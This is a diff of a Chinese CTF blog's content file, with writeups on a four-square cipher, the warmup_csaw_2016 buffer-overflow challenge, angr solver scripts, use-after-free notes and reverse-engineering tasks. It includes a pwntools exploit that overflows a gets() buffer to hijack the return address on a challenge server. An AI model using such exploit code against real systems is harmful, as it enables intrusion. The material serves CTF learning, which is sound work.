+<h3 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h3><p>题目链接：<a href="https://buuoj.cn/files/adf09f561e314b56e65728810c377035/7ce788ae-4e7e-4c30-b9b9-c558ad94f7c5.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE4MH0.XmpVkw.BOqIrh67tkpxMQfO6eSXFRtCbwM">点击获取</a></p>
+<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>来自题目的提示，四面八方，提示四方密码。<strong>四方密码</strong>是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。 这种方法将字母两个一组，然后采用多字母替换密码。首先选择两个英文字作密匙，例如example和keyword。对于每一个密匙，将重复出现的字母去除，即example要转成exampl，然后将每个字母顺序放入矩阵，再将余下的字母顺序放入矩阵，便得出加密矩阵。<br>将这两个加密矩阵放在右上角和左下角，余下的两个角放a到z顺序的矩阵：<br>加密的步骤：</p>
 <ol>
-<li><p>地址分配方式</p>
-<p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p>
-</li>
+<li>两个字母一组地分开讯息：（例如hello world变成he ll ow or ld）；</li>
+<li>找出第一个字母在左上角矩阵的位置；</li>
+<li>同样道理，找第二个字母在右下角矩阵的位置；</li>
+<li>找右上角矩阵中，和第一个字母同行，第二个字母同列的字母；</li>
+<li>找左下角矩阵中，和第一个字母同列，第二个字母同行的字母；</li>
+<li>得到的这两个字母就是加密过的讯息。</li>
+<li>he lp me ob iw an ke no bi的加密结果：FY NF NE HW BX AF FO KH MD</li>
 </ol>
-<h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_20031215365014902656863653.jpg!33.jpg" alt=""></p>
+<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>自己动手画</p>
+<h2 id="0x02-PWN"><a href="#0x02-PWN" class="headerlink" title="0x02 PWN"></a>0x02 PWN</h2><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>题目链接：<a href="https://buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5MH0.XmpYGw.FeTRtFI215Vnv-BJFYhg9Jlhp5g">点击获取</a></p>
+<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>IDA打开之后，可以看到：</p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155055QQ%E6%88%AA%E5%9B%BE20200312235011.png" alt=""></p>
+<p>可以看到危险函数gets，常见的危险函数还有strcpy，strcat，sprintf。这些函数可以造成缓冲区溢出。简单的说，我们需要用数据填充缓冲区，覆盖返回地址，这样我们就可以控制代码执行。在这个程序中，存在一个构造好的函数，用于读取flag。</p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155906QQ%E6%88%AA%E5%9B%BE20200312235828.png" alt=""></p>
+<p>这个地址也被输给我们了，所以我们只要确定到底要覆盖多长就行了。开启pwn-dbg调试。</p>
+<p>我们可以用python的pwn模块下的cyclic函数构造一个比较长的字符串并输入，可以发现：</p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
+<p>可以发现长度为72</p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment">#p = pwn.process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">p = pwn.remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span>)</span><br><span class="line">elf = pwn.ELF(<span class="string">&#x27;./warmup_csaw_2016&#x27;</span>)</span><br><span class="line">assdr = <span class="number">0x40060d</span></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">pwn.context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+pwn.p64(assdr)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
@@ -648,6 +621,33 @@
 <p>假设在scanf函数下执行，08048694为scanf函数恢复栈，所以应从08048697开始模拟</p>
 <h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/04_angr_symbolic_stack/04_angr_symbolic_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># 载入程序</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048697</span></span><br><span class="line"><span class="comment"># 开始模拟的地址</span></span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr = start_addr)</span><br><span class="line"><span class="comment"># 新建一个状态</span></span><br><span class="line"></span><br><span class="line">state.stack_push(state.regs.ebp)</span><br><span class="line"><span class="comment"># 压入ebp，模拟地址0x08048679代码</span></span><br><span class="line"></span><br><span class="line">state.regs.ebp = state.regs.esp</span><br><span class="line"><span class="comment"># 模拟地址0x0804867A代码</span></span><br><span class="line"></span><br><span class="line">offest = <span class="number">0x8</span></span><br><span class="line"><span class="comment"># 两个局部变量</span></span><br><span class="line"><span class="comment"># var_C= dword ptr -0Ch  也就是占的地址是 0x9 a b c</span></span><br><span class="line"><span class="comment"># var_10= dword ptr -10h 占的地址是 d e f 0x10</span></span><br><span class="line">state.regs.esp -= offest</span><br><span class="line"><span class="comment"># 初始化栈</span></span><br><span class="line"></span><br><span class="line">p1 = state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">p2 = state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">state.stack_push(p1)</span><br><span class="line">state.stack_push(p2)</span><br><span class="line"><span class="comment"># 创建两个位向量，并将其压入栈</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find = good, avoid = bad)</span><br><span class="line"><span class="comment"># 创建模拟管理器并开始探索路径</span></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    flag1 = found_state.solver.<span class="built_in">eval</span>(p1)</span><br><span class="line">    flag2 = found_state.solver.<span class="built_in">eval</span>(p2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag1,flag2))</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><h4 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/05_angr_symbolic_memory/05_angr_symbolic_memory&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048601</span></span><br><span class="line"><span class="comment"># 依旧是选择在scanf函数的下方初始化状态</span></span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr = start_addr)</span><br><span class="line">p1 = state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p2 = state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p3 = state.solver.BVS(<span class="string">&#x27;p3&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p4 = state.solver.BVS(<span class="string">&#x27;p4&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1C0</span>,p1)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1C8</span>,p2)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1D0</span>,p3)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1D8</span>,p4)</span><br><span class="line"><span class="comment"># 初始化四个位向量，并存入内存</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find = good, avoid = bad)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    flag1 = found_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag2 = found_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag3 = found_state.solver.<span class="built_in">eval</span>(p3,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag4 = found_state.solver.<span class="built_in">eval</span>(p4,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 先解释成bytes类型再转换成str</span></span><br><span class="line">    <span class="comment"># 貌似不能直接转换str</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag1,flag2,flag3,flag4))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>[PWNABLE.kr]uaf</title>
+    <url>/2020/06/14/PWNABLE-kr-uaf/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
+<li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
+</li>
+<li><p>使用方式</p>
+<ul>
+<li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>构造数据填充被释放的内存区域<ul>
+<li>再次调用该指针</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><p>地址分配方式</p>
+<p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p>
+</li>
+</ol>
+<h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
 ]]></content>
   </entry>
   <entry>
@@ -721,6 +721,42 @@
       </tags>
   </entry>
   <entry>
+    <title>练习题(1)</title>
+    <url>/2021/09/04/%E7%BB%83%E4%B9%A0%E9%A2%98-1/</url>
+    <content><![CDATA[<p>几天做了几道逆向题，简单记录一下解题思路和过程</p>
+<h2 id="Petition"><a href="#Petition" class="headerlink" title="Petition"></a>Petition</h2><p><a href="https://drive.google.com/file/d/1AjClukmJ8opf3QC_fkGQmMMoWWT7euYY/view?usp=sharing">程序链接</a><br>这个题目来自某次比赛的一个逆向题，比较有意思的是这个题目存在一些小小的问题，存在一些小小的反调试，题目中的数据操作大部分是异或操作，逆向起来直接反汇编无法分析程序，只能看汇编。<br>首先用IDA打开程序：<br><img src="https://i.loli.net/2021/09/04/KDo7S6Rw2Vfvpx1.png" alt=""></p>
+<p>分析这个程序，可得这个程序的检验的方式是逐字符检验，一旦有某个字符错误，就会直接推出，根据题目的难度和数据操作的方式，现有两个解决方案：</p>
+<ul>
+<li>Pin 插桩</li>
+<li>直接逆向<h3 id="直接逆向"><a href="#直接逆向" class="headerlink" title="直接逆向"></a>直接逆向</h3>这个需要分析一下程序的数据操作流程，根据动态调试可知，这个程序的流程是：</li>
+</ul>
+<ol>
+<li>首先是将输入的数据与一个大数进行异或，取其最后八位</li>
+<li>再将这个最后八位与函数里面的两个数据进行异或</li>
+<li>最后判断异或的结果是是否为0，为0则继续判断，否则退出<br><img src="https://i.loli.net/2021/09/04/bfOHWTNQ79gMYXd.png" alt=""><br>以此函数为例，使用0xcc84881e的最低位 0x1e与后面的0x3e 0x46进行异或,可得flag第一位，跟进函数sub_119c：<br><img src="https://i.loli.net/2021/09/04/ArDH4YTKLswboz1.png" alt=""><br>即可得到flag第二个字符的检测：<br><img src="https://i.loli.net/2021/09/04/l5TDXYw6L9yxkuO.png" alt=""><br>一直遍历可得flag:<br><em><code>flag&#123;96c69646-8184-4363-8de9-73f7398066c1&#125;</code></em><h3 id="Pin-插桩"><a href="#Pin-插桩" class="headerlink" title="Pin 插桩"></a>Pin 插桩</h3>待补充。。。。。</li>
+</ol>
+<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy-crypto"></a>easy-crypto</h2><p><a href="https://drive.google.com/file/d/1QNpSB0HszJ4h_ONWn4eQvTrv01MAXF1v/view?usp=sharing">程序链接</a><br>这个程序是一个PE可执行程序，可以本地动态调试，存在一定的花指令的，无法反汇编，需要将程序进行一些patch</p>
+<h3 id="花指令修复"><a href="#花指令修复" class="headerlink" title="花指令修复"></a>花指令修复</h3><p>找到主函数地址<code>0x401660</code>,发现未被实现为函数，手动设置为函数，报错：<br><code>.text:004016F4: The function has undefined instruction/data at the specified address.</code><br>在地址<code>0x4016f4</code>地址存在问题：<br><img src="https://i.loli.net/2021/09/04/NqdT4RcG5JSb36Y.png" alt=""><br>可知<code>0xede9</code>无法被识别, 将其patch为nop。程序存在多个同样的花指令，将其全部patch为nop后，就可以将其设置为函数，并可以进行反编译。</p>
+<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><ul>
+<li>main位置变换<br><img src="https://i.loli.net/2021/09/04/s6YUF4SyoHvXLP2.png" alt=""><br><img src="https://i.loli.net/2021/09/04/QbkKCGiJItzuXpE.png" alt=""></li>
+<li>base64：<br><img src="https://i.loli.net/2021/09/04/2Gx1nHpN7R85qXu.png" alt=""></li>
+<li>使用IDA插件findcrypt插件，查找加密算法，发现存在一个XTEA加密算法：<br><img src="https://i.loli.net/2021/09/04/IDiElqnbypVLUHP.png" alt=""></li>
+<li>检测结果<br><img src="https://i.loli.net/2021/09/04/cM2YCPlRS9r7wgu.png" alt=""><br>总结一下，函数通过一种未知变换，再进行XTEA加密后，最后进行base64加密，与密文进行比较。<br>python解密脚本：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table  = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;248n4EJTTTEaceRT8kL8EAgoxIaKfvamSsOfg5EXusE&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to</span>(<span class="params">s</span>):</span></span><br><span class="line">    dd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dd += (<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">return</span> dd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        flag += (<span class="string">&#x27;&#123;:06b&#125;&#x27;</span>.<span class="built_in">format</span>(table.find(i)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">        flags.append(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flags), <span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(to(flags[i:i+<span class="number">4</span>:][::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+XTEA解密<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt_xtea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12174208</span>, <span class="number">0x7adf778b</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x77ed300a</span>, <span class="number">0xa2c84b21</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v2[<span class="number">2</span>] = &#123;<span class="number">0xc2861844</span>, <span class="number">0x96f23dae</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v3[<span class="number">2</span>] = &#123;<span class="number">0x408fccd9</span>, <span class="number">0xca793b5a</span>&#125;;</span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0x33333333, 0x34343434&#125;;</span></span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0xa5884ef3, 0x6ea37aa2&#125;;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x6a</span>,<span class="number">0x78</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>&#125;;</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v1, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v2, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v3, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v3[<span class="number">0</span>],v3[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+由于变换是类似交换的操作，是可逆的，所以将解密的数据直接输入，就可以在动态调试看到flag<br><img src="https://i.loli.net/2021/09/04/KnTsZwmv2rYG6oU.png" alt=""><br><em><code>flag&#123;f1bf4dfbfc4dc9df45b5da87d552ed02&#125;</code></em></li>
+</ul>
+<h2 id="before-main"><a href="#before-main" class="headerlink" title="before-main"></a>before-main</h2><p>这是最简单的题目，难点是无法反编译，存在花指令，只能看汇编，但只是一个简单的异或</p>
+<h3 id="花指令分析"><a href="#花指令分析" class="headerlink" title="花指令分析"></a>花指令分析</h3><p><img src="https://i.loli.net/2021/09/04/pQAlB8KMUZuzrP2.png" alt=""><br>还是存在几个花指令，nop掉之后，还是存在栈不平衡，但是只有存在异或操作<br><img src="https://i.loli.net/2021/09/04/z2UGkaeNfZKyYsF.png" alt=""><br>异或的密文为<code>0x00403138</code>处的数据:<br><img src="https://i.loli.net/2021/09/04/7KBHjuSrQh1msYV.png" alt=""><br>key具有迷惑性，为<code>dword_404018</code>处的数据，但是在<code>0x401075</code>处进行修改了<br><img src="https://i.loli.net/2021/09/04/YwFvHtoNDVu8kgq.png" alt=""><br><img src="https://i.loli.net/2021/09/04/3ntJmDp5rieYk96.png" alt=""><br>key最终为：<code>[122, 115, 120, 106]</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0x1C</span>, <span class="number">0x1F</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x1D</span>, <span class="number">0x1F</span>, <span class="number">0x2C</span>, <span class="number">0x11</span>, <span class="number">0x58</span>, <span class="number">0x49</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x17</span>]</span><br><span class="line">key = [<span class="number">122</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">106</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">  s += (<span class="built_in">chr</span>(enc[i]^key[i%<span class="number">4</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;jx5z_qwe_i23as&#125;</span></span><br></pre></td></tr></table></figure>
+<p><em><code>flag&#123;jx5z_qwe_i23as&#125;</code></em></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>RE</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第十二届全国大学生信息安全竞赛--Writeup</title>
     <url>/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/</url>
     <content><![CDATA[<p>Author: <a href="https://ch3cke.github.io/">ch3cke</a></p>
@@ -781,42 +817,6 @@
       </categories>
       <tags>
         <tag>总结</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>练习题(1)</title>
-    <url>/2021/09/04/%E7%BB%83%E4%B9%A0%E9%A2%98-1/</url>
-    <content><![CDATA[<p>几天做了几道逆向题，简单记录一下解题思路和过程</p>
-<h2 id="Petition"><a href="#Petition" class="headerlink" title="Petition"></a>Petition</h2><p><a href="https://drive.google.com/file/d/1AjClukmJ8opf3QC_fkGQmMMoWWT7euYY/view?usp=sharing">程序链接</a><br>这个题目来自某次比赛的一个逆向题，比较有意思的是这个题目存在一些小小的问题，存在一些小小的反调试，题目中的数据操作大部分是异或操作，逆向起来直接反汇编无法分析程序，只能看汇编。<br>首先用IDA打开程序：<br><img src="https://i.loli.net/2021/09/04/KDo7S6Rw2Vfvpx1.png" alt=""></p>
-<p>分析这个程序，可得这个程序的检验的方式是逐字符检验，一旦有某个字符错误，就会直接推出，根据题目的难度和数据操作的方式，现有两个解决方案：</p>
-<ul>
-<li>Pin 插桩</li>
-<li>直接逆向<h3 id="直接逆向"><a href="#直接逆向" class="headerlink" title="直接逆向"></a>直接逆向</h3>这个需要分析一下程序的数据操作流程，根据动态调试可知，这个程序的流程是：</li>
-</ul>
-<ol>
-<li>首先是将输入的数据与一个大数进行异或，取其最后八位</li>
-<li>再将这个最后八位与函数里面的两个数据进行异或</li>
-<li>最后判断异或的结果是是否为0，为0则继续判断，否则退出<br><img src="https://i.loli.net/2021/09/04/bfOHWTNQ79gMYXd.png" alt=""><br>以此函数为例，使用0xcc84881e的最低位 0x1e与后面的0x3e 0x46进行异或,可得flag第一位，跟进函数sub_119c：<br><img src="https://i.loli.net/2021/09/04/ArDH4YTKLswboz1.png" alt=""><br>即可得到flag第二个字符的检测：<br><img src="https://i.loli.net/2021/09/04/l5TDXYw6L9yxkuO.png" alt=""><br>一直遍历可得flag:<br><em><code>flag&#123;96c69646-8184-4363-8de9-73f7398066c1&#125;</code></em><h3 id="Pin-插桩"><a href="#Pin-插桩" class="headerlink" title="Pin 插桩"></a>Pin 插桩</h3>待补充。。。。。</li>
-</ol>
-<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy-crypto"></a>easy-crypto</h2><p><a href="https://drive.google.com/file/d/1QNpSB0HszJ4h_ONWn4eQvTrv01MAXF1v/view?usp=sharing">程序链接</a><br>这个程序是一个PE可执行程序，可以本地动态调试，存在一定的花指令的，无法反汇编，需要将程序进行一些patch</p>
-<h3 id="花指令修复"><a href="#花指令修复" class="headerlink" title="花指令修复"></a>花指令修复</h3><p>找到主函数地址<code>0x401660</code>,发现未被实现为函数，手动设置为函数，报错：<br><code>.text:004016F4: The function has undefined instruction/data at the specified address.</code><br>在地址<code>0x4016f4</code>地址存在问题：<br><img src="https://i.loli.net/2021/09/04/NqdT4RcG5JSb36Y.png" alt=""><br>可知<code>0xede9</code>无法被识别, 将其patch为nop。程序存在多个同样的花指令，将其全部patch为nop后，就可以将其设置为函数，并可以进行反编译。</p>
-<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><ul>
-<li>main位置变换<br><img src="https://i.loli.net/2021/09/04/s6YUF4SyoHvXLP2.png" alt=""><br><img src="https://i.loli.net/2021/09/04/QbkKCGiJItzuXpE.png" alt=""></li>
-<li>base64：<br><img src="https://i.loli.net/2021/09/04/2Gx1nHpN7R85qXu.png" alt=""></li>
-<li>使用IDA插件findcrypt插件，查找加密算法，发现存在一个XTEA加密算法：<br><img src="https://i.loli.net/2021/09/04/IDiElqnbypVLUHP.png" alt=""></li>
